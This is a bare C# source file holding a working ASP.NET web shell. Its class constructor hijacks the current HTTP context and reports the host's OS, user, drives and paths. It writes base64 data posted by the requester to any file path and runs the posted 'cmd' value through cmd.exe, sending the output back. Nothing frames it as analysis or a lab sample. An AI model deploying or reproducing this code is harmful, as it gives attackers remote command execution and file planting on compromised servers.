using System.IO;
using System;
using System.Text;
class E
{
    public E()
    {
        System.Web.HttpContext context = System.Web.HttpContext.Current;
        context.Server.ClearError();
        context.Response.Clear();
        context.Response.Write(System.Environment.Version.ToString() + "\n");
        context.Response.Write(System.Environment.OSVersion.ToString() + "\n");
        context.Response.Write(System.Environment.UserName.ToString() + "\n");
        for (int i = 0; i < System.Environment.GetLogicalDrives().Length; i++)
            context.Response.Write(System.Environment.GetLogicalDrives()[i] + "\n");

        context.Response.Write(System.Environment.CurrentDirectory + "\n");
        context.Response.Write(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName + "\n");
        context.Response.Write(System.AppDomain.CurrentDomain.BaseDirectory + "\n");
        context.Response.Write(context.Request.ServerVariables["PATH_TRANSLATED"] + "\n");

        string filename = context.Request.Form["filename"];
        if (filename!=null)
        {
            context.Response.Write(filename + "\n");
            try
            {
                BinaryWriter fx = new BinaryWriter(new FileStream(filename, FileMode.Create));
                string b64 = context.Request.Form["base64"];
                if (b64 != null)
                {
                    byte[] rawdata = Convert.FromBase64String(b64);
                    fx.Write(rawdata, 0, rawdata.Length);
                }
                fx.Close();
            }
            catch (Exception ex) 
            {
                context.Response.Write(ex.Message + "\n");
            }
        }


        try
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "cmd.exe";
            string cmd = context.Request.Form["cmd"];
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.StandardOutputEncoding = Encoding.UTF8;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            context.Response.Write(output);
        }
        catch (Exception ex)
        {
            context.Response.Write(ex.Message + "\n");
        }
        context.Response.Flush();
        context.Response.End();
    }
}
